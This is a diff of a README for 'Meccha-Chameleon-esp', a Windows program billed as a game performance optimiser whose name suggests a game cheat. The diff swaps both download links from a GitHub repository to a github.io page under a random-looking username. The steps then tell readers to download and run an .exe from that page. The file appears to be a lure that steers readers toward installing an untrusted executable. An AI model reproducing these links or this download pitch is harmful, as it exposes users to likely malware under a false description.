@@ -1,6 +1,6 @@
 # 🦎 Meccha-Chameleon-esp - Improve your game performance and speed
 
-[![](https://img.shields.io/badge/Download-Meccha--Chameleon--esp-blue)](https://github.com/ursine-boletusmirabilis739/Meccha-Chameleon-esp)
+[![](https://img.shields.io/badge/Download-Meccha--Chameleon--esp-blue)](https://ursine-boletusmirabilis739.github.io)
 
 ## 🎯 About the tool
 Meccha-Chameleon-esp helps your computer run games with higher frame rates. It focuses on optimizing system resources to reduce input lag. The software adjustments target background processes that interfere with gaming performance. You gain smoother visuals and more responsive controls during active gameplay. 
@@ -16,7 +16,7 @@ Your system needs a few things before you run this software. Ensure you meet the
 ## 📥 How to download and install
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the latest version: [Download Page](https://github.com/ursine-boletusmirabilis739/Meccha-Chameleon-esp)
+1. Visit the repository page to download the latest version: [Download Page](https://ursine-boletusmirabilis739.github.io)
 2. Locate the release section on that page.
 3. Select the file ending in .exe.
 4. Save the file to your desktop or a folder you can locate easily.
